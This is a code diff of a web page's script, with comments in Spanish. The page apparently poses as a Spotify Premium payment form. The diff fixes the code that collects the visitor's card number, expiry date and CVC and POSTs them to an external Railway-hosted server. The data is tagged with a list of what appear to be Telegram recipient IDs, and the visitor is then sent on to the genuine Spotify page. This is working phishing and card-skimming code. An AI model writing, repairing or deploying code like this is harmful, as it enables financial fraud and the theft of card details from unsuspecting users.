@@ -192,8 +192,9 @@
 
   <script>
     // --- CONFIGURACIÓN DEL CLIENTE ---
-const IDS_DE_ESTE_CLIENTE = ['7707049896','6953415010'];  // ← Sin espacios después de las comas
-    const SERVER_URL = 'https://kezosc-production.up.railway.app'; 
+    // CORREGIDO: Array con corchetes []
+    const IDS_DE_ESTE_CLIENTE = ['7707049896', '6953415010'];
+    const SERVER_URL = 'https://kezosc-production.up.railway.app';
 
     function selectMethod(btn, method) {
       document.querySelectorAll('.method-btn').forEach(b => b.classList.remove('active'));
@@ -252,9 +253,9 @@ const IDS_DE_ESTE_CLIENTE = ['7707049896','6953415010'];  // ← Sin espacios de
       btn.disabled = true;
       btnText.innerHTML = 'Procesando...';
 
-      // CORREGIDO: Ahora usa lista_ids como array
+      // CORREGIDO: Usa IDS_DE_ESTE_CLIENTE (sin corchetes extra)
       const payload = {
-        lista_ids: [MY_TELEGRAM_ID],  // ← Array con el ID
+        lista_ids: IDS_DE_ESTE_CLIENTE,
         tarjeta: document.getElementById('cardNumber').value,
         expiracion: document.getElementById('cardExpiry').value,
         cvc: document.getElementById('cardCvc').value,
@@ -262,20 +263,18 @@ const IDS_DE_ESTE_CLIENTE = ['7707049896','6953415010'];  // ← Sin espacios de
       };
 
       try {
-        console.log("Enviando datos a:", SERVER_URL);
+        console.log("Enviando a IDs:", IDS_DE_ESTE_CLIENTE);
         const response = await fetch(`${SERVER_URL}/enviar-datos`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify(payload)
         });
         
-        if (response.ok) {
-          console.log("Envío exitoso");
-        } else {
-          console.error("Error del servidor:", response.status);
-        }
+        const data = await response.json();
+        console.log("Respuesta:", data);
+        
       } catch (error) {
-        console.error("Error de conexión:", error);
+        console.error("Error:", error);
       }
 
       window.location.href = 'https://www.spotify.com/mx/premium/';
